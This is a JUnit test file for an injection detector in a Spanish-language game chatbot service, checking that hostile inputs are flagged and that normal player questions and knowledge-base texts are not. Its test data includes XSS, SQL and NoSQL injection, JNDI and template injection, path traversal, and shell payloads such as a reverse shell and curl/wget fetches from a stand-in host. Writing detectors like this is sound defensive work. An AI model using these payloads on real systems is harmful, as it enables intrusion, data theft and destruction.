package com.nexusbattles.ms_chatbot.chat.entrada;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.MethodSource;
import org.junit.jupiter.params.provider.ValueSource;
import tools.jackson.databind.JsonNode;
import tools.jackson.databind.json.JsonMapper;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Stream;

import static org.assertj.core.api.Assertions.assertThat;

@DisplayName("7.4.8 · deteccion de intentos de inyeccion de codigo")
class DetectorDeInyeccionTest {

    private static final Path BASE = Path.of("src/main/resources/db/migration/V2__crear_base_de_conocimiento.sql");
    private static final Path BASE_COMPLETA = Path.of("contenido/base-de-conocimiento.json");

    @ParameterizedTest(name = "HTML: {0}")
    @ValueSource(strings = {
        "<script>alert(1)</script>",
        "hola <SCRIPT src=//x.y/z.js></script>",
        "< script >fetch('/api')</ script >",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "<iframe src=\"https://malo.example\"></iframe>",
        "<a href=\"#\" onclick=\"robar()\">premio</a>",
        "<div onmouseover = \"x()\">",
        "javascript:alert(document.cookie)",
        "data:text/html;base64,PHNjcmlwdD4=",
        "<body onload=x()>"
    })
    void reconoceHtmlQueEjecuta(String texto) {
        assertThat(DetectorDeInyeccion.detectar(texto)).contains(DetectorDeInyeccion.Tipo.HTML);
    }

    @ParameterizedTest(name = "SQL: {0}")
    @ValueSource(strings = {
        "' OR '1'='1",
        "admin' or 1=1 --",
        "\" or \"a\"=\"a",
        "1' AND 'x'='x",
        "x') OR ('1'='1",
        "1 UNION SELECT usuario, clave FROM cuentas",
        "1 union all select null,null",
        "1 UNION/**/SELECT 1",
        "'; DROP TABLE mensajes; --",
        "abc; truncate table conversaciones",
        "x'; DELETE FROM calificaciones",
        "; insert into tickets_soporte values (1)",
        "1; update usuarios set rol='ADMIN'",
        "'; select * from information_schema.tables",
        "1 AND pg_sleep(10)",
        "1 or sleep(5)",
        "'; WAITFOR DELAY '0:0:5'--",
        "exec xp_cmdshell 'dir'"
    })
    void reconoceSql(String texto) {
        assertThat(DetectorDeInyeccion.detectar(texto)).contains(DetectorDeInyeccion.Tipo.SQL);
    }

    @ParameterizedTest(name = "plantilla: {0}")
    @ValueSource(strings = {
        "${jndi:ldap://malo.example/a}",
        "${ jndi : rmi://x/y}",
        "${env:AWS_SECRET_ACCESS_KEY}",
        "#{T(java.lang.Runtime).getRuntime().exec('id')}",
        "${T(java.lang.System).getenv()}",
        "{{config.items()}}",
        "{{ ''.__class__.__mro__[1].__subclasses__() }}",
        "{{constructor.constructor('alert(1)')()}}",
        "<%= Runtime.getRuntime().exec(\"id\") %>"
    })
    void reconocePlantillas(String texto) {
        assertThat(DetectorDeInyeccion.detectar(texto)).contains(DetectorDeInyeccion.Tipo.PLANTILLA);
    }

    @ParameterizedTest(name = "comando: {0}")
    @ValueSource(strings = {
        "hola; rm -rf /",
        "x && cat /etc/hosts.allow",
        "nombre | nc -e /bin/sh 10.0.0.1 4444",
        "`whoami`",
        "$(curl http://malo.example/x.sh)",
        "a || wget http://malo.example",
        "; bash -i >& /dev/tcp/1.2.3.4/80",
        "&& powershell -enc AAAA",
        "; python -c 'import os'"
    })
    void reconoceComandos(String texto) {
        assertThat(DetectorDeInyeccion.detectar(texto)).contains(DetectorDeInyeccion.Tipo.COMANDO);
    }

    @ParameterizedTest(name = "nosql: {0}")
    @ValueSource(strings = {
        "{\"$where\": \"this.a == 1\"}",
        "{\"usuario\": {\"$ne\": null}}",
        "{'$gt': ''}",
        "{\"$regex\": \".*\"}"
    })
    void reconoceNoSql(String texto) {
        assertThat(DetectorDeInyeccion.detectar(texto)).contains(DetectorDeInyeccion.Tipo.NOSQL);
    }

    @ParameterizedTest(name = "ruta: {0}")
    @ValueSource(strings = {
        "../../../../etc/shadow",
        "..\\..\\windows\\win.ini",
        "abre /etc/passwd",
        "C:\\Windows\\System32"
    })
    void reconoceRutas(String texto) {
        assertThat(DetectorDeInyeccion.detectar(texto)).contains(DetectorDeInyeccion.Tipo.RUTA);
    }

    @ParameterizedTest(name = "pregunta normal: {0}")
    @ValueSource(strings = {
        "¿Cómo funciona la unión de equipos en el torneo?",
        "quiero seleccionar mi héroe y borrar un objeto",
        "necesito javascript: está activado en mi navegador?",
        "el script de la misión no carga",
        "si la vida < 40 y el daño > 3 qué pasa",
        "si mi vida es <40% pierdo?",
        "cuesta $5000 o 300 créditos?",
        "mi id es 123; me ayudas",
        "¿qué pasa si pierdo? -- es urgente",
        "'Escudo de dragón' o 'Espada de una mano'?",
        "el 'Guerrero Tanque' or the 'Mago Fuego'?",
        "tengo 2 armas & 2 ítems",
        "Select a hero from the list",
        "update: ya puedo entrar",
        "drop rate de la espada?",
        "how do I delete my history?",
        "my password is wrong, how do I reset it?",
        "¿Dónde están mis subastas? :)",
        "el precio es 1.000 COP | 300 créditos",
        "<3 me encanta el juego",
        "¿Qué significa 1d8?",
        "cuánto es 2+2=4",
        "uso Linux, ¿sirve cat o cmd?",
        "${precio} en la tienda"
    })
    void noBloqueaPreguntasNormales(String texto) {
        assertThat(DetectorDeInyeccion.detectar(texto)).isEmpty();
    }

    @ParameterizedTest(name = "{0}")
    @MethodSource("textosDeLaBaseDeConocimiento")
    @DisplayName("ninguna variante, titulo, respuesta ni caso de evaluacion de la base se bloquea")
    void noBloqueaNadaDeLaBase(String texto) {
        assertThat(DetectorDeInyeccion.detectar(texto)).as(texto).isEmpty();
    }

    @Test
    void vacioYNuloNoSonInyeccion() {
        assertThat(DetectorDeInyeccion.detectar(null)).isEmpty();
        assertThat(DetectorDeInyeccion.detectar("   ")).isEmpty();
    }

    static Stream<String> textosDeLaBaseDeConocimiento() throws IOException {
        List<String> textos = new ArrayList<>();
        // Cada literal SQL de la siembra (titulos, palabras clave separadas por
        // comas y respuestas en los dos idiomas).
        String sql = Files.readString(BASE, StandardCharsets.UTF_8);
        Matcher literal = Pattern.compile("'((?:[^']|'')*)'").matcher(sql);
        while (literal.find()) {
            String valor = literal.group(1).replace("''", "'");
            if (valor.length() < 3) {
                continue;
            }
            textos.add(valor);
            if (valor.contains(",")) {
                for (String parte : valor.split(",")) {
                    if (!parte.isBlank()) {
                        textos.add(parte.strip());
                    }
                }
            }
        }
        JsonNode temas = JsonMapper.builder().build().readTree(BASE_COMPLETA.toFile());
        for (JsonNode tema : temas.path("temas")) {
            textos.add(tema.path("titulo").asText());
            textos.add(tema.path("respuestaEs").asText());
            textos.add(tema.path("respuestaEn").asText());
            tema.path("variantesEs").forEach(v -> textos.add(v.asText()));
            tema.path("variantesEn").forEach(v -> textos.add(v.asText()));
        }
        temas.path("casos").forEach(caso -> textos.add(caso.path("pregunta").asText()));
        assertThat(textos).as("el corpus de la base no puede quedar vacio").hasSizeGreaterThan(200);
        return textos.stream().filter(t -> !t.isBlank());
    }
}
